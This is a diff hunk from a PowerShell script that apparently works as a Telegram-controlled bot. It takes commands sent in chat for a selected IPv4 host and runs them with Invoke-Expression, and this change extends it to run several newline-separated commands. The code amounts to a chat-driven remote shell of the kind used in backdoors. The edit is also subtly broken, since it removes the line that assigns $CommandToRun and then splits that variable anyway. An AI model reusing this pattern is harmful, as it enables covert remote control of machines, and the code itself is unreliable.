@@ -661,15 +661,17 @@ While ($DoNotExit)  {
 	  "/select $ipV4 *"  { #Important: run with a space
 	    #The user wants to run a command
 		#$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
-                $CommandToRun = $LastMessageText -replace "/select $ipV4 ", ""
+                $Commands = $CommandToRun -split "`r?`n"
 		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
 		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
 		
 		#Run the command
 		Try {
-		  Invoke-Expression $CommandToRun | Out-String | %  {
-		    $CommandToRun_Result += "`n $($_)"
-		  }
+		   foreach ($Command in $Commands) {
+    			Invoke-Expression $Command | Out-String | ForEach-Object {
+         		$CommandToRun_Result += "`n$($_)"
+                   }
+                 }
 		}
 		Catch  {
 		  $CommandToRun_Result = $_.Exception.Message
